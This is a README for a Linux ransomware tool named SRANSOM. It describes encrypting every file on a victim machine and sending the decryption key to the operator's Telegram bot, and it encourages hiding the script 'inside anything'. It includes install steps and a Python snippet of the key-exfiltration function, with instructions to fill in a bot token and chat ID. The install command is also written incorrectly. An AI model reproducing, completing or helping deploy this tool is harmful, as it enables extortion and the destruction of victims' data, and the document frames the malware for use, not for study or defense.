# SRANSOM

Linux Dedicated Ransomware

## Overview

SRANSOM is a ransomware that dedicated for a machine with linux as its operation system. When the script executed, it will encrypt every file with any format without exception and proceed to send the key to open it to your telegram. 
You can slip this script inside anything. 

SRANSOM first created at 09/09/2025 and finished at 04/10/2025. 

**NO AI IS USED IN THIS PROJECT**

## Installation

You will need a couple library for this script to work, i've put all of them inside a requirement file.

```bash
pip install requirement.txt 
```

## Adjustment

you need to also adjust a few thing inside the script.

```python
def telegram(kunci) :
	#deklarasi variabel :D
	TOKEN = "TOKEN FROM BOT FATHER"
	strkunci = str(kunci, 'utf-8')
	message = f"the string key is {strkunci}"
	idchat = "id chat from json"
```
Inside the ranscript.py you need to change variable TOKEN and idchat. 

Change to what?

Just watch this tutorial, i have no time to teach you.

(How to set the bot father)[https://www.youtube.com/watch?v=RIrIXLAj8bE&pp=ygUbYm90ZmF0aGVyIHRlbGVncmFtIHR1dG9yaWFs]

## After Word

*I hope this reach the right people and being used rightfully*
